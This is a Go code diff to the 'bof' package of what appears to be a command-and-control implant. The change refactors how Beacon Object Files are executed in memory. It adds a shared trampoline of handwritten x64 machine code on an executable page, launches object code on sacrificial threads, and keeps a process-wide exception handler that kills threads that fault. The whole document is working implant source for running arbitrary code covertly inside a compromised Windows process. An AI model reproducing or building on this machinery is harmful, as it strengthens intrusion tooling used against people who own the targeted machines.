@@ -5,6 +5,7 @@ package bof
 import (
 	"encoding/binary"
 	"fmt"
+	"runtime"
 	"sync"
 	"sync/atomic"
 	"syscall"
@@ -66,13 +67,15 @@ import (
 //     unavoidable. Set timeouts generously; this is a last-
 //     resort kill, not a routine cancellation primitive.
 //
-//   - On timeout the per-call thunk page is leaked (not freed).
+//   - On timeout the per-call args struct (24 B, Go heap) stays
+//     referenced via sacrificialMap and is never released.
 //     Windows offers no synchronous way to confirm a forcibly-
 //     terminated thread has actually stopped executing in our
-//     code; freeing the page while the thread is still in it
-//     would crash the host. The leaked pages are ~4 KB each and
-//     accumulate slowly — Close() does NOT reclaim them either
-//     (we can't tell which are still in use).
+//     code; releasing the struct could race with a final read
+//     by the terminated thread. The leaked structs are tiny and
+//     bounded by the number of timeouts the operator triggers —
+//     in practice negligible. Close() does NOT reclaim them
+//     either (same reason).
 //
 //   - The VEH is registered once per process via sync.Once and
 //     never removed. Tiny perma-handler in the implant's
@@ -82,9 +85,38 @@ import (
 var (
 	vehInstallOnce sync.Once
 	vehInstallErr  error
-	exitStubAddr   uintptr  // RX stub: rsp-align + mov rcx,1 + call ExitThread
-	sacrificialMap sync.Map // map[uint32 tid]*BOF — registered for VEH lookup
+	exitStubAddr   uintptr // RX stub: rsp-align + mov rcx,1 + call ExitThread
+
+	// Shared per-process entry trampoline. One 4 KB RX page,
+	// initialised lazily on first sacrificial Execute. Replaces
+	// the legacy per-call thunk: a *sacArgs struct address is
+	// passed to CreateThread via lpParameter (lands in rcx on
+	// thread start) and the stub demultiplexes it into rcx/rdx
+	// before tail-calling the BOF entry. Owns its own sync.Once
+	// so a future eviction strategy (or a unit test) can rebuild
+	// it without dragging the VEH install along.
+	trampolineInstallOnce sync.Once
+	trampolineInstallErr  error
+	sharedTrampolineAddr  uintptr
+
+	sacrificialMap sync.Map // map[uint32 tid]*sacFrame — registered for VEH lookup
 )
+
+// sacFrame is the per-Execute capsule passed to the shared
+// trampoline via CreateThread's lpParameter. The trampoline
+// reads three uintptrs at offsets 0/8/16; the bof field at
+// offset 24 is invisible to asm — used only by the VEH callback
+// (for mapping range checks) and Close (for liveness).
+//
+// Field order MUST stay in lock-step with the asm in
+// installSharedTrampoline; argPtr/argLen/entry MUST stay at
+// offsets 0/8/16 respectively.
+type sacFrame struct {
+	argPtr uintptr
+	argLen uintptr
+	entry  uintptr
+	bof    *BOF
+}
 
 // faultRecord captures the exception code + address the VEH saw.
 // Stored on *BOF by the VEH; read by the host thread after the
@@ -154,31 +186,34 @@ func (b *BOF) callEntry(args []byte) error {
 }
 
 // callEntrySacrificial runs the entry on a dedicated thread and
-// waits with the configured timeout. On clean return the per-call
-// thunk page is freed; on timeout the thunk leaks (we can't free
-// memory the terminated thread might still be touching).
+// waits with the configured timeout. The per-call sacArgs capsule
+// is small (24 B Go heap) and held alive via the sacrificialMap
+// entry; on clean return the entry is removed and Go GC reclaims
+// it. On timeout the entry is kept (we can't tell whether the
+// terminated thread is still dereferencing it) and the capsule
+// leaks — but it's tiny, and bounded by the operator's timeouts.
 func (b *BOF) callEntrySacrificial(argPtr, argLen uintptr) error {
 	if err := installSacrificialVEH(); err != nil {
 		return fmt.Errorf("runtime/bof: VEH install: %w", err)
 	}
-	thunk, err := buildEntryThunk(b.entryAddr, argPtr, argLen)
-	if err != nil {
-		return fmt.Errorf("runtime/bof: thunk alloc: %w", err)
+	if err := installSharedTrampoline(); err != nil {
+		return fmt.Errorf("runtime/bof: trampoline install: %w", err)
 	}
+
+	frame := &sacFrame{argPtr: argPtr, argLen: argLen, entry: b.entryAddr, bof: b}
 
 	const createSuspended uint32 = 0x4
 	hThread, _, e := api.ProcCreateThread.Call(
-		0,     // lpThreadAttributes
-		0,     // dwStackSize (default)
-		thunk, // lpStartAddress
-		0,     // lpParameter (unused; thunk has args baked)
+		0,                              // lpThreadAttributes
+		0,                              // dwStackSize (default)
+		sharedTrampolineAddr,           // lpStartAddress
+		uintptr(unsafe.Pointer(frame)), // lpParameter → rcx in trampoline
 		uintptr(createSuspended),
 		0, // lpThreadId out — we use GetThreadId on the returned handle
 	)
 	if hThread == 0 {
-		// Thunk allocation succeeded; CreateThread failed before
-		// any thread could touch it — safe to free immediately.
-		_ = windows.VirtualFree(thunk, 0, windows.MEM_RELEASE)
+		// CreateThread failed before any thread could read frame —
+		// Go GC will reclaim it as soon as we return.
 		return fmt.Errorf("runtime/bof: CreateThread: %w", e)
 	}
 	defer windows.CloseHandle(windows.Handle(hThread))
@@ -186,41 +221,45 @@ func (b *BOF) callEntrySacrificial(argPtr, argLen uintptr) error {
 	tidR, _, _ := api.ProcGetThreadId.Call(hThread)
 	tid := uint32(tidR)
 
-	sacrificialMap.Store(tid, b)
-	defer sacrificialMap.Delete(tid)
+	sacrificialMap.Store(tid, frame)
 	b.fault = faultRecord{} // clear from any previous call
 
-	// ResumeThread returns the previous suspend count (>= 0) on
-	// success, 0xFFFFFFFF on failure.
-	prevSuspend, _, e := api.ProcResumeThread.Call(hThread)
-	if prevSuspend == ^uintptr(0) {
+	// ResumeThread returns the previous suspend count on success,
+	// 0xFFFFFFFF on failure (x/sys/windows surfaces the latter as
+	// the err return).
+	prevSuspend, err := windows.ResumeThread(windows.Handle(hThread))
+	if prevSuspend == ^uint32(0) {
 		// Thread was created suspended and never started; safe
-		// to terminate + free the thunk.
+		// to drop the registry entry.
 		_, _, _ = api.ProcTerminateThread.Call(hThread, 1)
-		_ = windows.VirtualFree(thunk, 0, windows.MEM_RELEASE)
-		return fmt.Errorf("runtime/bof: ResumeThread: %w", e)
+		sacrificialMap.Delete(tid)
+		return fmt.Errorf("runtime/bof: ResumeThread: %w", err)
 	}
 
 	timeoutMs := durationToMs(b.sacrificialTimeout)
 	wait, err := windows.WaitForSingleObject(windows.Handle(hThread), timeoutMs)
 	if err != nil {
-		// Wait itself failed (rare — invalid handle, etc.). Don't
-		// free the thunk; the thread may still be running.
+		// Wait itself failed (rare — invalid handle, etc.). Keep
+		// the registry entry; the thread may still be running.
 		return fmt.Errorf("runtime/bof: WaitForSingleObject: %w", err)
 	}
 	if wait == uint32(windows.WAIT_TIMEOUT) {
 		_, _, _ = api.ProcTerminateThread.Call(hThread, 1)
-		// Thunk leaks — TerminateThread is asynchronous and the
-		// kernel offers no way to confirm the thread is fully
-		// stopped. Freeing the page here would race with any
-		// final instructions the thread executes after the
-		// terminate IPI is queued.
+		// Capsule leaks — TerminateThread is asynchronous and
+		// the kernel offers no way to confirm the thread is
+		// fully stopped. Leaving the sacrificialMap entry in
+		// place pins the *sacArgs against the GC.
 		return fmt.Errorf("runtime/bof: BOF timeout after %v", b.sacrificialTimeout)
 	}
 	// Thread terminated cleanly (either ran to completion OR
 	// faulted into the exit-stub which called ExitThread(1)).
-	// The thunk is no longer in use; safe to release.
-	_ = windows.VirtualFree(thunk, 0, windows.MEM_RELEASE)
+	// Safe to drop the entry; Go GC reclaims the capsule.
+	sacrificialMap.Delete(tid)
+	// Pin the frame until after Delete: the trampoline's last
+	// memory read is fenced by WaitForSingleObject's kernel-side
+	// acquire, but Go's escape analyser doesn't see that — keep
+	// the local ref live so the compiler can't shorten lifetime.
+	runtime.KeepAlive(frame)
 
 	code := atomic.LoadUint32(&b.fault.code)
 	if code != 0 {
@@ -252,40 +291,50 @@ func durationToMs(d time.Duration) uint32 {
 	return uint32(ms)
 }
 
-// buildEntryThunk allocates an RX page with a self-contained
-// trampoline: mov rcx, argPtr; mov rdx, argLen; mov rax,
-// entryAddr; jmp rax. CreateThread launches the thunk; the
-// thunk sets up the BOF's two-arg ABI and tail-calls.
-func buildEntryThunk(entry, argPtr, argLen uintptr) (uintptr, error) {
-	page, err := windows.VirtualAlloc(0, 4096,
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_READWRITE)
-	if err != nil {
-		return 0, err
-	}
-	buf := make([]byte, 0, 32)
-	// 48 b9 <argPtr64>            mov rcx, imm64
-	buf = append(buf, 0x48, 0xb9)
-	buf = appendUint64(buf, uint64(argPtr))
-	// 48 ba <argLen64>            mov rdx, imm64
-	buf = append(buf, 0x48, 0xba)
-	buf = appendUint64(buf, uint64(argLen))
-	// 48 b8 <entry64>             mov rax, imm64
-	buf = append(buf, 0x48, 0xb8)
-	buf = appendUint64(buf, uint64(entry))
-	// ff e0                       jmp rax
-	buf = append(buf, 0xff, 0xe0)
-
-	if err := writeRXStub(page, buf); err != nil {
-		_ = windows.VirtualFree(page, 0, windows.MEM_RELEASE)
-		return 0, err
-	}
-	return page, nil
+// installSharedTrampoline lazily builds the single per-process
+// RX stub that demultiplexes a *sacArgs into the BOF's two-arg
+// ABI. CreateThread lands the lpParameter value in rcx on x64;
+// the stub reads argPtr/argLen/entry from that struct and tail-
+// calls the entry. Reading entry first (into rax) lets us clobber
+// rcx last, since the source struct address lives in rcx.
+//
+// Has its own sync.Once (independent of the VEH install) so the
+// two concerns evolve separately — a future eviction strategy or
+// a unit test that wants to rebuild the trampoline does not have
+// to reinitialise the exception handler.
+func installSharedTrampoline() error {
+	trampolineInstallOnce.Do(func() {
+		page, err := windows.VirtualAlloc(0, 4096,
+			windows.MEM_COMMIT|windows.MEM_RESERVE,
+			windows.PAGE_READWRITE)
+		if err != nil {
+			trampolineInstallErr = fmt.Errorf("VirtualAlloc(trampoline): %w", err)
+			return
+		}
+		// Shared trampoline:
+		//   48 8b 41 10            mov rax, [rcx+0x10]   ; entry  (sacArgs.entry,  offset 16)
+		//   48 8b 51 08            mov rdx, [rcx+0x08]   ; argLen (sacArgs.argLen, offset  8)
+		//   48 8b 09               mov rcx, [rcx]        ; argPtr (sacArgs.argPtr, offset  0) — clobbers source
+		//   ff e0                  jmp rax
+		stub := []byte{
+			0x48, 0x8b, 0x41, 0x10,
+			0x48, 0x8b, 0x51, 0x08,
+			0x48, 0x8b, 0x09,
+			0xff, 0xe0,
+		}
+		if err := writeRXStub(page, stub); err != nil {
+			_ = windows.VirtualFree(page, 0, windows.MEM_RELEASE)
+			trampolineInstallErr = fmt.Errorf("VirtualProtect(trampoline): %w", err)
+			return
+		}
+		sharedTrampolineAddr = page
+	})
+	return trampolineInstallErr
 }
 
 // writeRXStub copies code into the page and flips the page to
-// PAGE_EXECUTE_READ. Shared helper between buildEntryThunk and
-// the exit-stub installation in installSacrificialVEH so the
+// PAGE_EXECUTE_READ. Shared helper between installSharedTrampoline
+// and the exit-stub installation in installSacrificialVEH so the
 // two callsites stay in lock-step on alignment + protection
 // semantics.
 func writeRXStub(page uintptr, code []byte) error {
@@ -293,12 +342,6 @@ func writeRXStub(page uintptr, code []byte) error {
 	copy(dst, code)
 	var old uint32
 	return windows.VirtualProtect(page, uintptr(len(code)), windows.PAGE_EXECUTE_READ, &old)
-}
-
-func appendUint64(buf []byte, v uint64) []byte {
-	var b [8]byte
-	binary.LittleEndian.PutUint64(b[:], v)
-	return append(buf, b[:]...)
 }
 
 // installSacrificialVEH wires the process-wide VEH + exit stub.
@@ -342,14 +385,16 @@ func installSacrificialVEH() error {
 		// instruction faulted. Aligning first is mandatory:
 		// ExitThread's prologue uses movaps on aligned stack
 		// slots; a misaligned rsp at call time tears.
+		var imm [8]byte
+		binary.LittleEndian.PutUint64(imm[:], uint64(etAddr))
 		buf := []byte{
 			0x48, 0x83, 0xe4, 0xf0, // and rsp, -16
 			0x48, 0x83, 0xec, 0x28, // sub rsp, 0x28
 			0x48, 0xc7, 0xc1, 0x01, 0x00, 0x00, 0x00, // mov rcx, 1
 			0x48, 0xb8, // mov rax, imm64
+			imm[0], imm[1], imm[2], imm[3], imm[4], imm[5], imm[6], imm[7],
+			0xff, 0xd0, 0xcc, // call rax; int3
 		}
-		buf = appendUint64(buf, uint64(etAddr))
-		buf = append(buf, 0xff, 0xd0, 0xcc) // call rax; int3
 
 		if err := writeRXStub(page, buf); err != nil {
 			_ = windows.VirtualFree(page, 0, windows.MEM_RELEASE)
@@ -377,7 +422,7 @@ func installSacrificialVEH() error {
 func sacrificialBOFActive(b *BOF) bool {
 	active := false
 	sacrificialMap.Range(func(_, v any) bool {
-		if v.(*BOF) == b {
+		if v.(*sacFrame).bof == b {
 			active = true
 			return false // stop iteration
 		}
@@ -428,11 +473,11 @@ func vehBOFFault(info uintptr) uintptr {
 	exceptionAddr := *(*uintptr)(unsafe.Pointer(recPtr + 16))
 
 	tid := windows.GetCurrentThreadId()
-	bofI, ok := sacrificialMap.Load(tid)
+	frameI, ok := sacrificialMap.Load(tid)
 	if !ok {
 		return exceptionContinueSearch
 	}
-	b := bofI.(*BOF)
+	b := frameI.(*sacFrame).bof
 	if b.execMem == 0 || exceptionAddr < b.execMem || exceptionAddr >= b.execMem+b.execMemSize {
 		return exceptionContinueSearch
 	}
